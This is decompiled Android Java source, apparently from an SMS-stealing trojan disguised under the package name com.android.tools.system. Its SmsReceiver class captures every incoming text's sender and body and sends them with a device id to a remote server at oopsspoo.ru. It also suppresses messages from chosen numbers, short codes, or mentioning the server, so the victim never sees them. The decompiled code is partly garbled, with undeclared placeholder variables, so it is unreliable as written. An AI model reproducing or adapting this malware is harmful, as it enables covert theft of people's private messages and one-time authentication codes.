package com.android.tools.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.telephony.gsm.SmsMessage;
import java.util.ArrayList;

public class SmsReceiver extends BroadcastReceiver {
    public String serverName = "oopsspoo.ru";

    @Override
    public void onReceive(Context context, Intent intent) {
        Object obj;
        Context context2 = context;
        Object[] objArr = (Object[]) intent.getExtras().get("pdus");
        String originatingAddress = SmsMessage.createFromPdu((byte[]) objArr[0]).getOriginatingAddress();
        String str = "";
        for (Object obj2 : objArr) {
            SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj2);
            StringBuffer stringBuffer = r25;
            StringBuffer stringBuffer2 = new StringBuffer();
            str = stringBuffer.append(str).append(createFromPdu.getMessageBody()).toString();
        }
        String string = context2.getSharedPreferences("Settings", 0).getString("id", "");
        if (!(string.equals("") || string == null)) {
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "url";
            r25 = obj2;
            obj2 = r25;
            r25[1] = "http://oopsspoo.ru/index.php";
            Object obj3 = obj2;
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "id";
            r25 = obj2;
            obj2 = r25;
            r25[1] = string;
            Object obj4 = obj2;
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "addmsg";
            r25 = obj2;
            obj2 = r25;
            Object obj5 = r25;
            StringBuffer stringBuffer3 = r25;
            StringBuffer stringBuffer4 = new StringBuffer();
            stringBuffer4 = r25;
            StringBuffer stringBuffer5 = new StringBuffer();
            stringBuffer5 = r25;
            StringBuffer stringBuffer6 = new StringBuffer();
            stringBuffer6 = r25;
            StringBuffer stringBuffer7 = new StringBuffer();
            obj5[1] = stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(stringBuffer6.append("Adressant: ").append(originatingAddress).toString()).append("\nText sms: ").toString()).append(str).toString()).append("\n\n").toString();
            Object obj6 = obj2;
            ArrayList arrayList = r25;
            ArrayList arrayList2 = new ArrayList();
            ArrayList arrayList3 = arrayList;
            boolean add = arrayList3.add(obj3);
            add = arrayList3.add(obj4);
            add = arrayList3.add(obj6);
            try {
                MyPostRequest myPostRequest = r25;
                MyPostRequest myPostRequest2 = new MyPostRequest(context2);
                myPostRequest = myPostRequest;
                ArrayList[] arrayListArr = new ArrayList[1];
                ArrayList[] arrayListArr2 = arrayListArr;
                arrayListArr[0] = arrayList3;
                AsyncTask execute = myPostRequest.execute(arrayListArr2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        SharedPreferences sharedPreferences = context2.getSharedPreferences("BlockNums", 0);
        String trim = originatingAddress.replaceAll("[^\\d]", "").trim();
        if (sharedPreferences.getBoolean(trim.equals("") ? originatingAddress.toLowerCase() : trim, false) || str.contains(this.serverName) || (sharedPreferences.getBoolean("short", false) && originatingAddress.trim().charAt(0) != "+".charAt(0) && originatingAddress.length() < 11)) {
            abortBroadcast();
        }
    }

    public SmsReceiver() {
    }
}
package com.android.tools.system;

import android.content.Context;
import android.os.AsyncTask;
import java.io.IOException;
import java.util.ArrayList;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class MyPostRequest extends AsyncTask<ArrayList<String[]>, Void, String> {
    public Context context;

    /* access modifiers changed from: protected|bridge */
    public /* bridge */ Object doInBackground(Object[] objArr) {
        return doInBackground((ArrayList[]) objArr);
    }

    /* access modifiers changed from: protected|bridge */
    public /* bridge */ void onPostExecute(Object obj) {
        onPostExecute((String) obj);
    }

    public MyPostRequest(Context context) {
        this.context = context;
    }

    /* access modifiers changed from: protected|varargs */
    @Override
    public String doInBackground(ArrayList<String[]>... arrayListArr) {
        ArrayList<String[]>[] arrayListArr2 = arrayListArr;
        String str = "";
        Object obj = null;
        Object obj2 = null;
        DefaultHttpClient defaultHttpClient = null;
        try {
            ArrayList arrayList = r16;
            ArrayList arrayList2 = new ArrayList();
            ArrayList arrayList3 = arrayList;
            for (int i = 1; i < arrayListArr2[0].size(); i++) {
                String[] strArr = (String[]) arrayListArr2[0].get(i);
                arrayList = arrayList3;
                BasicNameValuePair basicNameValuePair = r16;
                BasicNameValuePair basicNameValuePair2 = new BasicNameValuePair(strArr[0], Translit.toTranslit(strArr[1]));
                boolean add = arrayList.add(basicNameValuePair);
            }
            if (defaultHttpClient == null) {
                DefaultHttpClient defaultHttpClient2 = r16;
                DefaultHttpClient defaultHttpClient3 = new DefaultHttpClient();
                defaultHttpClient = defaultHttpClient2;
            }
            HttpPost httpPost = r16;
            HttpPost httpPost2 = new HttpPost(((String[]) arrayListArr2[0].get(0))[1]);
            HttpPost httpPost3 = httpPost;
            httpPost = httpPost3;
            UrlEncodedFormEntity urlEncodedFormEntity = r16;
            UrlEncodedFormEntity urlEncodedFormEntity2 = new UrlEncodedFormEntity(arrayList3);
            httpPost.setEntity(urlEncodedFormEntity);
            str = EntityUtils.toString(defaultHttpClient.execute(httpPost3).getEntity(), "UTF-8");
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (Exception e3) {
            e3.printStackTrace();
        }
        return str;
    }

    /* access modifiers changed from: protected */
    @Override
    public void onPostExecute(String str) {
        super.onPostExecute(str);
    }
}
